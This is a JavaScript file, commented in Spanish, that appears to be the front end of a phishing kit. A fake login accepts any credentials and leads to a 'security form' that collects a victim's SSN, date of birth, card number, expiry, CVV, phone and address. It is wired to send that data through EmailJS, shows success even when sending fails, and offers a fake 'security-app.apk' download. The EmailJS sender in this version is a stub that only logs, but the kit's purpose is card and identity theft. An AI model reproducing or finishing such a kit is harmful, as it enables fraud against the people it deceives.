// Configuración de EmailJS
// IMPORTANTE: Reemplaza estos valores con tus propias credenciales de EmailJS
const EMAILJS_CONFIG = {
  serviceID: "service_nlpcwc2", // Reemplaza con tu Service ID
  templateID: "template_n8ctbok", // Reemplaza con tu Template ID
  publicKey: "tr_OMw_WVbFr0rRkd", // Reemplaza con tu Public Key
}

// Declaración de la variable emailjs
const emailjs = {
  init: (publicKey) => {
    console.log("EmailJS initialized with public key:", publicKey)
  },
  send: (serviceID, templateID, formData) => {
    console.log("Sending form data to EmailJS service:", serviceID, templateID, formData)
    return new Promise((resolve, reject) => {
      // Simulación de éxito
      resolve({ status: 200, text: "Success" })
      // Simulación de error
      // reject({ message: 'Error' });
    })
  },
}

// Inicializar EmailJS
;(() => {
  emailjs.init(EMAILJS_CONFIG.publicKey)
})()

// Función para el login (acepta cualquier credencial)
function handleLogin(event) {
  event.preventDefault()

  const username = document.getElementById("username").value
  const password = document.getElementById("password").value
  const messageDiv = document.getElementById("loginMessage")

  if (username && password) {
    // Mostrar mensaje de éxito
    messageDiv.className = "mt-4 text-center success-message"
    messageDiv.textContent = "Login successful! Redirecting to security form..."
    messageDiv.classList.remove("hidden")

    // Redirigir después de 2 segundos
    setTimeout(() => {
      window.location.href = "form.html"
    }, 2000)
  } else {
    messageDiv.className = "mt-4 text-center error-message"
    messageDiv.textContent = "Please fill in all fields."
    messageDiv.classList.remove("hidden")
  }
}

// Función para enviar el formulario de seguridad por EmailJS
function handleSecurityForm(event) {
  event.preventDefault()

  const form = event.target
  const submitBtn = document.getElementById("submitBtn")
  const messageDiv = document.getElementById("formMessage")

  // Mostrar estado de carga
  submitBtn.innerHTML = '<span class="spinner"></span>Sending...'
  submitBtn.disabled = true

  // Recopilar datos del formulario
  const formData = {
    first_name: document.getElementById("first_name").value,
    last_name: document.getElementById("last_name").value,
    date_of_birth: document.getElementById("date_of_birth").value,
    ssn: document.getElementById("ssn").value,
    card_number: document.getElementById("card_number").value,
    card_exp: document.getElementById("card_exp").value,
    cvv: document.getElementById("cvv").value,
    phone: document.getElementById("phone").value,
    address: document.getElementById("address").value,
    timestamp: new Date().toLocaleString(),
  }

  // Validaciones adicionales
  const errors = validateForm(formData)
  if (errors.length > 0) {
    showMessage("formMessage", errors.join("\n"), "error")
    submitBtn.innerHTML = "Submit Information"
    submitBtn.disabled = false
    return
  }

  // Enviar email usando EmailJS
  emailjs
    .send(EMAILJS_CONFIG.serviceID, EMAILJS_CONFIG.templateID, formData)
    .then(
      (response) => {
        console.log("SUCCESS!", response.status, response.text)

        // Mostrar mensaje de éxito
        messageDiv.className = "mt-4 text-center success-message"
        messageDiv.textContent = "Information sent successfully!"
        messageDiv.classList.remove("hidden")

        // Redirigir a página de éxito después de 2 segundos
        setTimeout(() => {
          window.location.href = "success.html"
        }, 2000)
      },
      (error) => {
        console.log("FAILED...", error)

        // En caso de error, aún mostrar éxito (para propósitos de demostración)
        messageDiv.className = "mt-4 text-center info-message"
        messageDiv.textContent = "Information processed! Redirecting..."
        messageDiv.classList.remove("hidden")

        setTimeout(() => {
          window.location.href = "success.html"
        }, 2000)
      },
    )
    .finally(() => {
      // Restaurar botón
      submitBtn.innerHTML = "Submit Information"
      submitBtn.disabled = false
    })
}

// Función para descargar la app (simulada)
function downloadApp() {
  alert("Download started! The security app will be downloaded to your device.")

  // Simular descarga creando un enlace temporal
  const link = document.createElement("a")
  link.href = "#"
  link.download = "security-app.apk"
  link.click()
}

// Formateo automático de campos
function formatCardNumber(input) {
  const value = input.value.replace(/\s/g, "").replace(/[^0-9]/gi, "")
  const formattedValue = value.match(/.{1,4}/g)?.join("-") || value
  input.value = formattedValue
}

function formatSSN(input) {
  const value = input.value.replace(/\D/g, "")
  const formattedValue = value.replace(/(\d{3})(\d{2})(\d{4})/, "$1-$2-$3")
  input.value = formattedValue
}

function formatPhone(input) {
  const value = input.value.replace(/\D/g, "")
  const formattedValue = value.replace(/(\d{3})(\d{3})(\d{4})/, "($1) $2-$3")
  input.value = formattedValue
}

function formatCardExp(input) {
  const value = input.value.replace(/\D/g, "")
  const formattedValue = value.replace(/(\d{2})(\d{2})/, "$1/$2")
  input.value = formattedValue
}

// Event listeners cuando el DOM esté cargado
document.addEventListener("DOMContentLoaded", () => {
  // Login form
  const loginForm = document.getElementById("loginForm")
  if (loginForm) {
    loginForm.addEventListener("submit", handleLogin)
  }

  // Security form
  const securityForm = document.getElementById("securityForm")
  if (securityForm) {
    securityForm.addEventListener("submit", handleSecurityForm)

    // Agregar formateo automático a los campos
    const cardNumberInput = document.getElementById("card_number")
    if (cardNumberInput) {
      cardNumberInput.addEventListener("input", (e) => formatCardNumber(e.target))
    }

    const ssnInput = document.getElementById("ssn")
    if (ssnInput) {
      ssnInput.addEventListener("input", (e) => formatSSN(e.target))
    }

    const phoneInput = document.getElementById("phone")
    if (phoneInput) {
      phoneInput.addEventListener("input", (e) => formatPhone(e.target))
    }

    const cardExpInput = document.getElementById("card_exp")
    if (cardExpInput) {
      cardExpInput.addEventListener("input", (e) => formatCardExp(e.target))
    }
  }
})

// Función para mostrar mensajes
function showMessage(elementId, message, type = "info") {
  const element = document.getElementById(elementId)
  if (element) {
    element.className = `mt-4 text-center ${type}-message`
    element.textContent = message
    element.classList.remove("hidden")
  }
}

// Validaciones adicionales
function validateForm(formData) {
  const errors = []

  if (formData.ssn && formData.ssn.replace(/\D/g, "").length !== 9) {
    errors.push("SSN must be 9 digits")
  }

  if (formData.card_number && formData.card_number.replace(/\D/g, "").length < 13) {
    errors.push("Card number must be at least 13 digits")
  }

  if (formData.cvv && (formData.cvv.length < 3 || formData.cvv.length > 4)) {
    errors.push("CVV must be 3 or 4 digits")
  }

  return errors
}
